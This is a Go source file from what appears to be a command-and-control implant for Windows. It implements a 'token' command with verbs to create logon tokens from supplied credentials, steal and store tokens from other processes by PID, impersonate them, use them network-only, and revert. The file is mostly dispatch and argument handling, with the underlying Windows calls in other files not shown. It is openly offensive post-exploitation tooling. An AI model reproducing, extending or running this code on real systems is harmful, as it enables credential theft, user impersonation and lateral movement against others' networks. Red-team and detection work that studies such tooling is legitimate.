// server/docker/payloads/Windows/action_token_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"
)

// TokenCommand consolidates all token management functionality
type TokenCommand struct{}

func (c *TokenCommand) Name() string {
	return "token"
}

func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output:      "Usage: token <verb> [arguments]\nVerbs: create, steal, store, use, impersonate, netonly, list, current, remove, clear, revert",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	verb := strings.ToLower(args[0])
	verbArgs := args[1:]

	switch verb {
	// === Token Creation ===
	case "create":
		return c.handleCreate(ctx, verbArgs)

	// === Token Stealing ===
	case "steal":
		return c.handleSteal(ctx, verbArgs)
	case "store":
		return c.handleStore(ctx, verbArgs)

	// === Token Usage ===
	case "use":
		return c.handleUse(ctx, verbArgs)
	case "impersonate":
		return c.handleImpersonate(ctx)

	// === Network-Only Management ===
	case "netonly":
		return c.handleNetOnly(ctx, verbArgs)

	// === Token Listing/Info ===
	case "list":
		return c.handleList(ctx, verbArgs)
	case "stored":
		return c.handleStored(ctx)
	case "current", "status":
		return c.handleCurrent(ctx)

	// === Token Cleanup ===
	case "remove":
		return c.handleRemove(ctx, verbArgs)
	case "clear":
		return c.handleClear(ctx)
	case "revert", "rev2self":
		// Allow both for compatibility
		return c.handleRevert(ctx)

	default:
		return CommandResult{
			Output:      fmt.Sprintf("Unknown verb: %s\nUse 'token help' for available commands", verb),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Creation (from make-token)
// ============================================================================

func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandResult {
	// Delegate to existing MakeTokenCommand logic
	makeToken := &MakeTokenCommand{}

	if len(args) == 0 {
		return CommandResult{
			Output:      "Usage: token create <DOMAIN\\user> <password> <n> [logon_type]\n       token create netonly <DOMAIN\\user> <password> <n>",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle 'token create netonly' specially
	if args[0] == "netonly" {
		if len(args) < 4 {
			return CommandResult{
				Output:      "Usage: token create netonly <DOMAIN\\user> <password> <name>",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return makeToken.createNetOnlyToken(ctx, args[1], args[2], args[3])
	}

	// Regular token creation
	if len(args) < 3 {
		return CommandResult{
			Output:      "Usage: token create <DOMAIN\\user> <password> <name> [logon_type]",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	userpass := args[0]
	password := args[1]
	tokenName := args[2]
	logonType := "interactive"
	if len(args) > 3 {
		logonType = args[3]
	}

	return makeToken.createToken(ctx, userpass, password, tokenName, logonType)
}

// ============================================================================
// Token Stealing (from steal-token)
// ============================================================================

func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      "Usage: token steal <pid> [name] [netonly]",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Invalid PID: %s", args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	name := ""
	netOnly := false

	// Parse additional arguments for name and netonly flag
	for i := 1; i < len(args); i++ {
		if strings.ToLower(args[i]) == "netonly" {
			netOnly = true
		} else if name == "" {
			name = args[i]
		}
	}

	return stealToken.stealAndImpersonate(ctx, pid, name, netOnly)
}

func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 2 {
		return CommandResult{
			Output:      "Usage: token store <pid> <name> [netonly]",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Invalid PID: %s", args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 2 && strings.ToLower(args[2]) == "netonly" {
		netOnly = true
	}

	return stealToken.storeToken(ctx, pid, args[1], netOnly)
}

// ============================================================================
// Token Usage
// ============================================================================

func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      "Usage: token use <name> [netonly]",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 1 && strings.ToLower(args[1]) == "netonly" {
		netOnly = true
	}

	return stealToken.useStoredToken(ctx, args[0], netOnly)
}

func (c *TokenCommand) handleImpersonate(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.impersonateToken(ctx)
}

// ============================================================================
// Network-Only Management
// ============================================================================

func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) == 0 {
		return stealToken.showNetOnlyStatus()
	}

	action := strings.ToLower(args[0])
	switch action {
	case "set":
		if len(args) < 2 {
			return CommandResult{
				Output:      "Usage: token netonly set <name>",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return stealToken.setNetOnlyToken(ctx, args[1])

	case "clear":
		return stealToken.clearNetOnlyToken(ctx)

	case "status":
		return stealToken.showNetOnlyStatus()

	default:
		return CommandResult{
			Output:      fmt.Sprintf("Unknown netonly action: %s\nUse: token netonly [set|clear|status]", action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Listing/Info
// ============================================================================

func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandResult {
	// Check if they want to list processes (token list processes)
	if len(args) > 0 && args[0] == "processes" {
		stealToken := &StealTokenCommand{}
		return stealToken.listTokens()
	}

	// Otherwise show stored tokens
	return c.handleStored(ctx)
}

func (c *TokenCommand) handleStored(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.listStoredTokens()
}

func (c *TokenCommand) handleCurrent(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.getCurrentTokenInfo()
}

// ============================================================================
// Token Cleanup
// ============================================================================

func (c *TokenCommand) handleRemove(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      "Usage: token remove <name>",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return stealToken.removeStoredToken(ctx, args[0])
}

func (c *TokenCommand) handleClear(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.clearTokens(ctx)
}

func (c *TokenCommand) handleRevert(ctx *CommandContext) CommandResult {
	rev2self := &Rev2SelfCommand{}
	return rev2self.Execute(ctx, []string{})
}
